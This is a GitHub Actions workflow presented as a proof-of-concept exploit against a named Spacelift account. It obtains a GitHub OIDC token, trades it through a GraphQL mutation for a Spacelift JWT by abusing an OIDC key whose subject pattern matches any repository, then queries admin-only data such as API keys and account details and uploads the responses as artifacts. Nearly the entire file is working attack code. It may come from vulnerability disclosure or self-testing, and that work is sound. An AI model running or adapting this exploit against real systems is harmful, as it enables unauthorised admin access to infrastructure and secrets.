name: ğŸ”¥ Spacelift OIDC Exploit - PROOF OF VULNERABILITY
on: 
  workflow_dispatch:
  push:
    branches: [ main ]

permissions:
  id-token: write  # Required for OIDC token
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: ğŸ¯ Get GitHub OIDC Token
        id: get_token
        run: |
          echo "ğŸ”‘ Requesting OIDC token with audience: https://github.com/x46gamer"
          
          # Request OIDC token from GitHub with matching audience  
          # This matches the clientId of exploit-poc-x46gamer OIDC key
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://github.com/x46gamer" | jq -r .value)
          
          # Mask token in logs
          echo "::add-mask::$TOKEN"
          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          
          echo "âœ… Token obtained successfully"
          
          # Display token payload (without signature)
          echo "ğŸ“„ Token payload:"
          echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || true
      
      - name: ğŸš¨ EXPLOIT - Authenticate to Spacelift GraphQL
        env:
          OIDC_TOKEN: ${{ steps.get_token.outputs.token }}
        run: |
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "ğŸ”¥ ATTEMPTING AUTHENTICATION BYPASS"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          echo "Target: https://soufian3hm.app.spacelift.dev"
          echo "Vulnerable OIDC Key: exploit-poc-x46gamer"  
          echo "Client ID: https://github.com/x46gamer"
          echo "Subject Pattern: .* (matches ANY subject)"
          echo ""
          
          # Step 1: Exchange OIDC token for Spacelift JWT using apiKeyUser
          echo "Step 1: Exchanging OIDC token for Spacelift JWT..."
          echo "Using OIDC API Key ID: oidc::https://github.com/x46gamer::01KGZXVF4XHKXB9M0C9TTXD7ZS"
          
          RESPONSE=$(curl -sS -X POST https://soufian3hm.app.spacelift.dev/graphql \
            -H "Content-Type: application/json" \
            -d "{\"query\":\"mutation { apiKeyUser(id: \\\"oidc::https://github.com/x46gamer::01KGZXVF4XHKXB9M0C9TTXD7ZS\\\", secret: \\\"$OIDC_TOKEN\\\") { jwt } }\"}")
          
          echo "Response:"
          echo "$RESPONSE" | jq . || echo "$RESPONSE"
          
          # Extract JWT if successful
          SPACELIFT_JWT=$(echo "$RESPONSE" | jq -r '.data.apiKeyUser.jwt // empty')
          
          if [ -n "$SPACELIFT_JWT" ] && [ "$SPACELIFT_JWT" != "null" ]; then
            echo ""
            echo "ğŸš¨ğŸš¨ğŸš¨ AUTHENTICATION SUCCESSFUL! ğŸš¨ğŸš¨ğŸš¨"
            echo "Obtained Spacelift JWT token!"
            echo "::add-mask::$SPACELIFT_JWT"
            echo "spacelift_jwt=$SPACELIFT_JWT" >> $GITHUB_OUTPUT
            
            # Save for next steps
            echo "$SPACELIFT_JWT" > spacelift_jwt.txt
          else
            echo ""
            echo "âŒ Authentication failed or token not returned"
            exit 1
          fi
      
      - name: ğŸ’£ PROVE ADMIN ACCESS - Query Account Info
        if: success()
        run: |
          SPACELIFT_JWT=$(cat spacelift_jwt.txt)
          
          echo ""
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "ğŸ’£ PROVING ADMIN ACCESS"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          
          # Query viewer (current user)
          echo "Querying current user (viewer)..."
          curl -sS -X POST https://soufian3hm.app.spacelift.dev/graphql \
            -H "Authorization: Bearer $SPACELIFT_JWT" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ viewer { login id admin username } }"}' \
            -o viewer.json
          
          echo "Viewer Response:"
          cat viewer.json | jq . || cat viewer.json
          
          # Query API keys (admin-only operation)
          echo ""
          echo "Querying API keys (requires admin)..."
          curl -sS -X POST https://soufian3hm.app.spacelift.dev/graphql \
            -H "Authorization: Bearer $SPACELIFT_JWT" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ apiKeys { id name admin type } }"}' \
            -o apikeys.json
          
          echo "API Keys Response:"
          cat apikeys.json | jq . || cat apikeys.json
          
          # Query account settings
          echo ""
          echo "Querying account settings..."
          curl -sS -X POST https://soufian3hm.app.spacelift.dev/graphql \
            -H "Authorization: Bearer $SPACELIFT_JWT" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ account { id name } }"}' \
            -o account.json
          
          echo "Account Response:"
          cat account.json | jq . || cat account.json
      
      - name: ğŸ“Š VULNERABILITY CONFIRMED
        if: success()
        run: |
          echo ""
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "ğŸš¨ VULNERABILITY CONFIRMED ğŸš¨"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo ""
          echo "âœ… Obtained GitHub OIDC token from THIS repository"
          echo "âœ… Exchanged OIDC token for Spacelift JWT"
          echo "âœ… Authenticated to Spacelift GraphQL API"
          echo "âœ… Queried admin-level data successfully"
          echo ""
          echo "IMPACT:"
          echo "- ANY GitHub repository can authenticate to this Spacelift account"
          echo "- The OIDC key has pattern '.*' which matches ANY subject claim"
          echo "- Full admin access to infrastructure and secrets"
          echo ""
          echo "CVSS: 8.1 (High) - Authentication Bypass + Privilege Escalation"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
      
      - name: ğŸ“¤ Upload Proof of Exploitation
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: spacelift-exploit-proof
          path: |
            viewer.json
            apikeys.json
            account.json
          retention-days: 7
